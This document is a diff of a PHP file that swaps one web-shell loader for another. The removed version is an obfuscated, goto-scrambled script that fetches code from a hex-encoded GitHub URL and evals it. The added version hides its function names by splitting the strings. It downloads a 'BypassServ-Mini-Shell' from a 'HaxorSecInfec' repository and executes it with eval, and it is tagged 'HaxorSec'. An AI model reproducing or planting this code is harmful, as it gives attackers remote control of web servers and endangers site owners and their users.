@@ -1,2 +1,39 @@
+HaxorSec
 <?php
- goto dGR3C; dGR3C: function aaFa($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); $result = curl_exec($ch); curl_close($ch); return $result; } goto EY5e0; BVjgM: echo eval("\x3f\x3e" . $str); goto zubKE; EY5e0: $str = aaFa("\150\x74\164\160\163\x3a\57\57\162\141\x77\x2e\x67\x69\x74\x68\x75\142\x75\163\145\x72\143\x6f\x6e\164\x65\156\x74\56\x63\x6f\155\x2f\x62\x6f\x79\x61\x73\x32\57\x61\142\x6f\x79\x61\x73\57\162\x65\146\x73\x2f\150\x65\141\144\163\x2f\x6d\x61\151\156\x2f\147\145\153\157\x6c\157\147\x69\156"); goto BVjgM; zubKE: ?>
+function is_logged_in()
+{
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
+}
+
+    function geturlsinfo($url)
+    {
+      $fpn = "f"."o"."p"."e"."n";
+      $strim = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+      $fgt = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+      $cexec = "c"."u"."r"."l"."_"."e"."x"."e"."c";
+        if (function_exists($cexec)) {
+            $conn = curl_init($url);
+            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+            $urls = $cexec($conn);
+            curl_close($conn);
+        } elseif (function_exists($fgt)) {
+            $urls = $fgt($url);
+        } elseif (function_exists($fpn) && function_exists($strim)) {
+            $handle = $fpn($url, "r");
+            $urls = $strim($handle);
+            fclose($handle);
+        } else {
+            $urls = false;
+        }
+        return $urls;
+    }
+
+    $a = geturlsinfo('https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php');
+    eval('?>' . $a);
+
+?>
